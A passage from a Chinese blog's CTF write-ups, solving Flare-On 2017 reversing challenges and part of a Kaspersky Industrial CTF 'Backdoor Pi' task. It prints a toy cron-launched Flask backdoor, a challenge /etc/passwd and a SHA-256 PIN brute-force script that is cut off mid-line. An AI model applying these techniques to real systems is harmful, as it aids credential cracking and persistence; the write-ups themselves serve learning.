 <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>解rot13即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">alias</span> rot13=<span class="string">&quot;tr &#x27;[A-Za-z]&#x27; &#x27;[N-ZA-Mn-za-m]&#x27;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> PyvragFvqrYbtvafNerRnfl@syner-ba.pbz | rot13</span><br></pre></td></tr></table></figure><p>flag： <code>ClientSideLoginsAreEasy@flare-on.com</code></p><h2 id="Igniteme"><a href="#Igniteme" class="headerlink" title="Igniteme"></a>Igniteme</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> <span class="title">check</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> len; <span class="comment">// ST04_4</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+4h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> ia; <span class="comment">// [esp+4h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">char</span> key; <span class="comment">// [esp+Bh] [ebp-1h]</span></span><br><span class="line"></span><br><span class="line">  len = <span class="built_in">strlen</span>((<span class="keyword">int</span>)input_cpy);</span><br><span class="line">  key = getkey();</span><br><span class="line">  <span class="keyword">for</span> ( i = len - <span class="number">1</span>; i &gt;= <span class="number">0</span>; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    cmpprep[i] = key ^ input_cpy[i];</span><br><span class="line">    key = input_cpy[i];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( ia = <span class="number">0</span>; ia &lt; <span class="number">0x27</span>; ++ia )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( cmpprep[ia] != (<span class="keyword">unsigned</span> __int8)cmptable[ia] )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序启动后输入字符串XOR然后做对比。</p><h3 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vp = [<span class="number">0x0D</span>, <span class="number">0x26</span>, <span class="number">0x49</span>, <span class="number">0x45</span>, <span class="number">0x2A</span>, <span class="number">0x17</span>, <span class="number">0x78</span>, <span class="number">0x44</span>, <span class="number">0x2B</span>, <span class="number">0x6C</span>, <span class="number">0x5D</span>, <span class="number">0x5E</span>, <span class="number">0x45</span>, <span class="number">0x12</span>, <span class="number">0x2F</span>, <span class="number">0x17</span>, <span class="number">0x2B</span>, <span class="number">0x44</span>, <span class="number">0x6F</span>, <span class="number">0x6E</span>, <span class="number">0x56</span>, <span class="number">0x09</span>, <span class="number">0x5F</span>, <span class="number">0x45</span>, <span class="number">0x47</span>, <span class="number">0x73</span>, <span class="number">0x26</span>, <span class="number">0x0A</span>, <span class="number">0x0D</span>, <span class="number">0x13</span>, <span class="number">0x17</span>, <span class="number">0x48</span>, <span class="number">0x42</span>, <span class="number">0x01</span>, <span class="number">0x40</span>, <span class="number">0x4D</span>, <span class="number">0x0C</span>, <span class="number">0x02</span>, <span class="number">0x69</span>, <span class="number">0x04</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(vp)<span class="number">-2</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">  vp[i] = vp[i] ^ vp[i+<span class="number">1</span>]</span><br><span class="line">vp = <span class="string">&#x27;&#x27;</span>.join([ chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> vp[:<span class="number">-1</span>]])</span><br><span class="line"><span class="comment"># R_y0u_H0t_3n0ugH_t0_1gn1t3@flare-on.com</span></span><br></pre></td></tr></table></figure><h2 id="Greektome"><a href="#Greektome" class="headerlink" title="Greektome"></a>Greektome</h2><div align=center>![](https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-flare-on-greektome-01.jpg)</div><p>这是一个使用套接字从另一台机器接收数据的程序。看看代码我们可以看到IP地址=’127.0.0.1’和端口= 0x8AE = 2222的程序是开放的。Buf 接收4个字节=&gt; len（data_send）&lt;= 4</p><p>收到数据后，程序使用loc_40107c []数组中的元素将Buf [0]替换为xor， 并添加22h  ，然后将其保存到数组。</p><div align=center>![](https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-flare-on-greektome-02.jpg)</div><p>实质上<br>输入被分成多组，每组20个字符，密钥验证算法如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># # Key judgement</span><br><span class="line"># for &amp;bytes in 0x40107c -&gt; 0x40107c+0x79:</span><br><span class="line">#     bytes ^&#x3D; key</span><br><span class="line">#     bytes +&#x3D; 0x22</span><br><span class="line"># assert( 0xFB5E &#x3D;&#x3D; sub_4011E6(0x40107C, 0x79) )</span><br><span class="line"></span><br><span class="line"># # sub_4011E6(x,y)</span><br><span class="line"># assert( y !&#x3D; 0)</span><br><span class="line"># ebx &#x3D; x</span><br><span class="line"># eax &#x3D; 0x14</span><br><span class="line"># &#123;</span><br><span class="line">#     di &#x3D; (int16)var_4</span><br><span class="line">#     esi &#x3D; min(eax, edx)</span><br><span class="line">#     edx -&#x3D; esi</span><br><span class="line">#     &#123;</span><br><span class="line">#         eax &#x3D; </span><br><span class="line">#     &#125;</span><br><span class="line"># &#125;</span><br><span class="line"># &#x2F;&#x2F; CMOVx: Conditional move according to X</span><br><span class="line"># v2: 0x79 -&gt; 0x65 -&gt; 0x51 -&gt; 0x3D -&gt; 0x29 -&gt; 0x15 -&gt; 0x01 -&gt; 0</span><br></pre></td></tr></table></figure><h3 id="解题-2"><a href="#解题-2" class="headerlink" title="解题"></a>解题</h3><p>爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generator</span>(<span class="params">a1,a2</span>):</span></span><br><span class="line">    v2 = a2</span><br><span class="line">    v3 = <span class="number">0xff</span></span><br><span class="line">    v8 = <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> a2:</span><br><span class="line">        <span class="keyword">raise</span> ValueError</span><br><span class="line">    v4 = a1</span><br><span class="line">    scanned = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> v2:</span><br><span class="line">        v5 = v8</span><br><span class="line">        v6 = <span class="number">0x14</span> <span class="keyword">if</span> v2&gt;<span class="number">0x14</span> <span class="keyword">else</span> v2</span><br><span class="line">        v2 = v2 - v6</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(v6):</span><br><span class="line">            v5 = v5 + a1[scanned]</span><br><span class="line">            v5 = v5 &amp; <span class="number">0xFFFF</span></span><br><span class="line">            v3 = v3 + v5</span><br><span class="line">            v3 = v3 &amp; <span class="number">0xFFFF</span></span><br><span class="line">            scanned = scanned + <span class="number">1</span></span><br><span class="line">            <span class="comment">#print(&quot;% 3d - % 3d&quot;%(scanned, v6))</span></span><br><span class="line">        v8 = (v5 &gt;&gt; <span class="number">8</span>) + (<span class="number">0xff</span>&amp;v5)</span><br><span class="line">        v8 = v8 &amp; <span class="number">0xFFFF</span></span><br><span class="line">        v3 = (v3 &gt;&gt; <span class="number">8</span>) + (<span class="number">0xff</span>&amp;v3)</span><br><span class="line">        v3 = v3 &amp; <span class="number">0xFFFF</span></span><br><span class="line">        print(<span class="string">&quot;=== % 4x = % 4x ===&quot;</span>%(v8,v3))</span><br><span class="line">    <span class="keyword">return</span> ( (v8 &gt;&gt; <span class="number">8</span>) + ((<span class="number">0xFF</span>) &amp; v8) ) | ( <span class="number">0xFFFF</span> &amp; ( (v3 &lt;&lt; <span class="number">8</span>) + ((<span class="number">0xFF00</span>) &amp; v3) ) )</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">xk</span>):</span></span><br><span class="line">    borg = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    33 E1 C4 99 </span></span><br><span class="line"><span class="string">    11 06 81 16 F0 32 9F C4  91 17 06 81 14 F0 06 81 </span></span><br><span class="line"><span class="string">    15 F1 C4 91 1A 06 81 1B  E2 06 81 18 F2 06 81 19 </span></span><br><span class="line"><span class="string">    F1 06 81 1E F0 C4 99 1F  C4 91 1C 06 81 1D E6 06 </span></span><br><span class="line"><span class="string">    81 62 EF 06 81 63 F2 06  81 60 E3 C4 99 61 06 81 </span></span><br><span class="line"><span class="string">    66 BC 06 81 67 E6 06 81  64 E8 06 81 65 9D 06 81 </span></span><br><span class="line"><span class="string">    6A F2 C4 99 6B 06 81 68  A9 06 81 69 EF 06 81 6E </span></span><br><span class="line"><span class="string">    EE 06 81 6F AE 06 81 6C  E3 06 81 6D EF 06 81 72 </span></span><br><span class="line"><span class="string">    E9 06 81 73 7C &quot;&quot;&quot;</span></span><br><span class="line">    bbs = [(<span class="number">0xff</span>&amp;((i^xk)+<span class="number">0x22</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> list(bytes.fromhex(borg.replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>)))]</span><br><span class="line">    <span class="keyword">return</span> generator(bbs, <span class="number">0x79</span>)</span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0xff</span>):</span><br><span class="line">    <span class="keyword">if</span> ( check(i) == <span class="number">0xFB5E</span> ):</span><br><span class="line">        j=i</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># j = 0xa2</span></span><br><span class="line"><span class="comment"># Now it is time to check bytes</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x79</span>):</span><br><span class="line">    ida_bytes.patch_byte(<span class="number">0x40107c</span>+i, ida_bytes.get_byte(<span class="number">0x40107c</span>+i)^j)</span><br><span class="line"><span class="comment"># et_tu_brute_force@flare-on.com</span></span><br></pre></td></tr></table></figure><h2 id="Notepad"><a href="#Notepad" class="headerlink" title="Notepad"></a>Notepad</h2><p>这个题目就略坑了。。<br>此题wp参考 杜师傅 <a href="https://bbs.xdsec.club/d/116-flare-on-4-challange-problem-1-11-writeup">https://bbs.xdsec.club/d/116-flare-on-4-challange-problem-1-11-writeup</a></p><p>一道侧重于样本分析的程序。源程序是Windows的记事本，被在另一个段注入了新代码，并修改了OEP。新代码会使用ROR13获取所有加载模块的哈希，并按照如下算法比较并存储之</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="keyword">module</span> in PEB-&gt;LDRDATA-&gt;InMemoryOrderModuleList</span><br><span class="line">    <span class="function"><span class="keyword">if</span> <span class="title">HashROR13</span><span class="params">(<span class="keyword">module</span>.name)</span></span>==HashROR13(TargetModuleName):</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">module</span> # <span class="keyword">for</span> futher usage ;)</span><br></pre></td></tr></table></figure><p>注意的是，在我的Windows 10中，这段程序会出问题，因为由于一些未知的原因，这段代码在我机器上获取的模块名称为大写，而ROR13的实现是区分大小写的。我们在0x10153F6下断点，断点日志为Parsing {s:edx}，查看日志：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Parsing L<span class="string">&quot;4_notepad.exe&quot;</span></span><br><span class="line">Parsing L<span class="string">&quot;ntdll.DLL&quot;</span></span><br><span class="line">Parsing L<span class="string">&quot;KERNEL32.DLL&quot;</span></span><br><span class="line">Parsing L<span class="string">&quot;KERNELBASE.dll&quot;</span></span><br><span class="line">Parsing L<span class="string">&quot;comdlg32.dll&quot;</span></span><br></pre></td></tr></table></figure><p>可以发现KERNEL32被跳过了。patch掉此处，便于动态调试。</p><p>对于被调用的函数，我们可以用Flare-IDA中的Shellcode-hashes脚本来辅助分析。静态分析后发现，程序在遍历%USERPROFILE%/flareon2016challenge目录下的文件，检查其时间是否符合特征值。如果符合，就提取出其中的八个字节到key.bin中，以此类推。Swings师傅提醒后，发现正确的文件是从去年的题目包中下载的（P.S 我觉得这个题设计的一般）。释放文件后再次执行程序，会弹出对话框：</p><p><a href="mailto:&#98;&#108;&#52;&#53;&#x37;&#x5f;&#102;&#114;&#x30;&#x6d;&#x5f;&#116;&#104;&#x33;&#x5f;&#x70;&#x34;&#x35;&#55;&#64;&#x66;&#x6c;&#97;&#x72;&#x65;&#x2d;&#x6f;&#110;&#x2e;&#99;&#x6f;&#109;">&#98;&#108;&#52;&#53;&#x37;&#x5f;&#102;&#114;&#x30;&#x6d;&#x5f;&#116;&#104;&#x33;&#x5f;&#x70;&#x34;&#x35;&#55;&#64;&#x66;&#x6c;&#97;&#x72;&#x65;&#x2d;&#x6f;&#110;&#x2e;&#99;&#x6f;&#109;</a></p><h2 id="Pewpewboat"><a href="#Pewpewboat" class="headerlink" title="Pewpewboat"></a>Pewpewboat</h2><p>这是一个linux下的游戏<br>关卡有100关，<br>我们在静态分析下main函数</p><div align=center>![](https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-flare-on-pewpewboat-01.jpg)</div><p>该函数genInitialSeed (0x403C85)生成用于“解密”游戏数据的初始种子。我会让你读它，但它本质上MD5是”loading… %d%%”一个循环中的字符串，%d每次递增。<br>然后，我们将看到99个级别的循环，每次迭代从576个字节的表复制游戏数据，然后使用以下命令解密它seed</p><p>我们可以进看一下他的循环</p><div align=center>![](https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-flare-on-pewpewboat-02.jpg)</div><p>从drawGrid (0x403263)功能上我们可以看到，我们输入的坐标和“船”的实际位置都存储在gameState。该代码将根据用户输入的坐标来检查正确的坐标，并且只有在有匹配的情况下才绘制</p><div align=center>![](https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-flare-on-pewpewboat-03.jpg)</div><p>我们继续process (0x04038D6)处理从用户输入的功能，检查命中并根据需要提前游戏状态。在这个功能中，你将会看到游戏状态中的更多内容，比如你的排名（例如“Seaman Recruit”）：</p><h3 id="解题-3"><a href="#解题-3" class="headerlink" title="解题"></a>解题</h3><p>回到游戏流程。每轮游戏中，你的输入值除了会影响DiskStatus外，还会被原样放到上面结构体的LastInputUpperCase中。如果对应的点在GoodStatus中为True，那么就算击中。此外，每轮游戏中，checksum值都会变，用来解密下一轮游戏。</p><p>所以我们通过解数据的方式解决</p><div align=center>![](https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-flare-on-pewpewboat-04.jpg)</div><p>这个程序算出来的值的前8个字节就是这关的过关关键</p><p>依次过关之后会出现</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Aye! You found some letters did ya? To find what you<span class="string">&#x27;re looking for, you&#x27;</span>ll want to re-order them: 9, 1, 2, 7, 3, 5, 6, 5, 8, 0, 2, 3, 5, 6, 1, 4. Next you <span class="built_in">let</span> 13 ROT <span class="keyword">in</span> the sea! THE FINAL SECRET CAN BE FOUND WITH ONLY THE UPPER CASE</span><br></pre></td></tr></table></figure><p>的提示</p><p>重新组织地图字母FHGUZREJVO得到OHGJURERVFGUREHZ<br>rot13之后得到BUTWHEREISTHERUM</p><p>直接输入到程序中就得到flag了。。</p><p><a href="mailto:&#121;&#x30;&#x75;&#x5f;&#x5f;&#x73;&#x55;&#110;&#x4b;&#x5f;&#109;&#x59;&#x5f;&#x5f;&#x50;&#51;&#87;&#112;&#51;&#x77;&#x5f;&#98;&#x30;&#52;&#116;&#x40;&#x66;&#108;&#x61;&#114;&#101;&#45;&#111;&#x6e;&#46;&#x63;&#x6f;&#109;">&#121;&#x30;&#x75;&#x5f;&#x5f;&#x73;&#x55;&#110;&#x4b;&#x5f;&#109;&#x59;&#x5f;&#x5f;&#x50;&#51;&#87;&#112;&#51;&#x77;&#x5f;&#98;&#x30;&#52;&#116;&#x40;&#x66;&#108;&#x61;&#114;&#101;&#45;&#111;&#x6e;&#46;&#x63;&#x6f;&#109;</a></p><p>今晚先写到这。。明天继续写</p><h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><h2 id="突然发现国内有有人写的挺完整的-我就不继续往下写了"><a href="#突然发现国内有有人写的挺完整的-我就不继续往下写了" class="headerlink" title="突然发现国内有有人写的挺完整的 我就不继续往下写了"></a>突然发现国内有有人写的挺完整的 我就不继续往下写了</h2><p>突然发现国内有有人写的挺完整的 我就不继续往下写了<br>附上连接<br><a href="http://blog.nsfocus.net/flare-onchallenge4th/">http://blog.nsfocus.net/flare-onchallenge4th/</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> Flare on </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kaspersky Industrial CTF Quals 2017 - Backdoor Pi</title>
      <link href="2017-Kaspersky-Industrial-CTF-Quals-Backdoor-Pi.html"/>
      <url>2017-Kaspersky-Industrial-CTF-Quals-Backdoor-Pi.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">swing@ubuntu:~/Desktop/fs$ ls var/spool/cron/crontabs/</span><br><span class="line">b4ckd00r_us3r  pi</span><br></pre></td></tr></table></figure><p>我可以看到有给后门账户</p><p>我们检查这个账户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">swing@ubuntu:~/Desktop/fs$ cat var/spool/cron/crontabs/b4ckd00r_us3r </span><br><span class="line"><span class="comment"># DO NOT EDIT THIS FILE - edit the master and reinstall.</span></span><br><span class="line"><span class="comment"># (/tmp/crontab.80NKS4/crontab installed on Wed Oct  4 19:28:12 2017)</span></span><br><span class="line"><span class="comment"># (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)</span></span><br><span class="line"><span class="comment"># m h  dom mon dow   command</span></span><br><span class="line">@reboot python /bin/back</span><br></pre></td></tr></table></figure><p>发现python 运行了一个 /bin/bash的文件</p><p>我们去查看文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">swing@ubuntu:~/Desktop/fs$ file bin/back</span><br><span class="line">bin/back: python 2.7 byte-compiled</span><br></pre></td></tr></table></figure><p>发现是编译后的python文件</p><p>反编译得到：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 2.12.0</span></span><br><span class="line"><span class="comment"># Python bytecode 2.7 (62211)</span></span><br><span class="line"><span class="comment"># [GCC 6.3.0 20170118]</span></span><br><span class="line"><span class="comment"># Embedded file name: back.py</span></span><br><span class="line"><span class="comment"># Compiled at: 2017-10-05 09:09:10</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> abort</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_creds</span>(<span class="params">user, pincode</span>):</span></span><br><span class="line">    <span class="keyword">if</span> len(pincode) &lt;= <span class="number">8</span> <span class="keyword">and</span> pincode.isdigit():</span><br><span class="line">        val = <span class="string">&#x27;&#123;&#125;:&#123;&#125;&#x27;</span>.format(user, pincode)</span><br><span class="line">        key = hashlib.sha256(val).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> key == <span class="string">&#x27;34c05015de48ef10309963543b4a347b5d3d20bbe2ed462cf226b1cc8fff222e&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Congr4ts, you found the b@ckd00r. The fl4g is simply : &#123;&#125;:&#123;&#125;&#x27;</span>.format(user, pincode)</span><br><span class="line">    <span class="keyword">return</span> abort(<span class="number">404</span>)</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&lt;h1&gt;HOME&lt;/h1&gt;&#x27;</span></span><br><span class="line"><span class="meta">@app.route(&#x27;/backdoor&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backdoor</span>():</span></span><br><span class="line">    user = request.args.get(<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line">    pincode = request.args.get(<span class="string">&#x27;pincode&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> check_creds(user, pincode)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(threaded=<span class="literal">True</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">3333</span>)</span><br><span class="line"><span class="comment"># okay decompiling back.pyc</span></span><br></pre></td></tr></table></figure><p>我们可以获取一个hash的值 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">swing@ubuntu:~/Desktop/fs$ cat etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/bin/sh</span><br><span class="line">man:x:6:12:man:/var/cache/man:/bin/sh</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/bin/sh</span><br><span class="line">mail:x:8:8:mail:/var/mail:/bin/sh</span><br><span class="line">news:x:9:9:news:/var/spool/news:/bin/sh</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh</span><br><span class="line">proxy:x:13:13:proxy:/bin:/bin/sh</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/bin/sh</span><br><span class="line">backup:x:34:34:backup:/var/backups:/bin/sh</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/bin/sh</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/bin/sh</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</span><br><span class="line">libuuid:x:100:101::/var/lib/libuuid:/bin/sh</span><br><span class="line">pi:x:1000:1000:,,,:/home/pi:/bin/bash</span><br><span class="line">sshd:x:101:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">ntp:x:102:104::/home/ntp:/bin/<span class="literal">false</span></span><br><span class="line">statd:x:103:65534::/var/lib/nfs:/bin/<span class="literal">false</span></span><br><span class="line">messagebus:x:104:106::/var/run/dbus:/bin/<span class="literal">false</span></span><br><span class="line">usbmux:x:105:46:usbmux daemon,,,:/home/usbmux:/bin/<span class="literal">false</span></span><br><span class="line">lightdm:x:106:109:Light Display Manager:/var/lib/lightdm:/bin/<span class="literal">false</span></span><br><span class="line">avahi:x:107:110:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/<span class="literal">false</span></span><br><span class="line">b4ckd00r_us3r:x:1001:1004::/home/b4ckd00r_us3r:/bin/bash</span><br></pre></td></tr></table></figure><p>我们已经知道的是  b4ckd00r_us3r  我们只需要确定剩下的位数就行了。可以做个暴力破解的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">a = <span class="string">&#x27;34c05015de48ef10309963543b4a347b5d3d20bbe2ed462cf226b1cc8fff222e&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> range(<span class="number">10000000</span>,<span class="number">99999999</span>):</span><br><span class="line">    b = <span class="string">&#x27;b4ckd00r_us3r:%08d&#x27;</span>% (i1)</span><br><span class="line">    key = hashlib.sha256(b).hexdigest()</span><br><span class="line">    <span class="keyword">print</span> b,key</span><br><span class="line">    <span class="keyword">if</span> key== 